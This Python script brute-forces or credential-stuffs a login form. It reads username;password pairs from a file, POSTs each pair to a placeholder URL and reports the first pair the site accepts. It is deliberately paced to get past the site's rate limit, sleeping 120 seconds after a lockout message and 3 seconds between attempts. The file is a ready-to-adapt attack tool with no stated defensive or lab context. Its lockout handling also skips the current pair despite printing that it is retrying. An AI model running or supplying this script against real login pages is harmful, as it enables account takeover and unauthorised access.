import requests
import time

URL = "<url>"

def test_creds(file_path):
    with open(file_path, "r") as f:
        for line in f:
            line = line.strip()
            if not line or ";" not in line:
                continue
            username, password = line.split(";", 1)
            data = {"username": username, "password": password}
            try:
                resp = requests.post(URL, data=data)
                if "Invalid username or password" in resp.text:
                    print(f"[FAIL] {username}:{password}")
                elif "Rate Limited Exceeded" in resp.text:
                    print(f"[LOCKED] Waiting 120s before retrying...")
                    time.sleep(120)  # wait out the lockout
                    continue
                else:
                    print(f"[SUCCESS] {username}:{password}")
                    return  # stop once you find the right creds
            except Exception as e:
                print(f"[ERROR] {username}:{password} -> {e}")
            time.sleep(3)  # throttle requests to avoid lockout

if __name__ == "__main__":
    test_creds("<filename>")

#NOTE: 
# Don't forget to change the url and filename
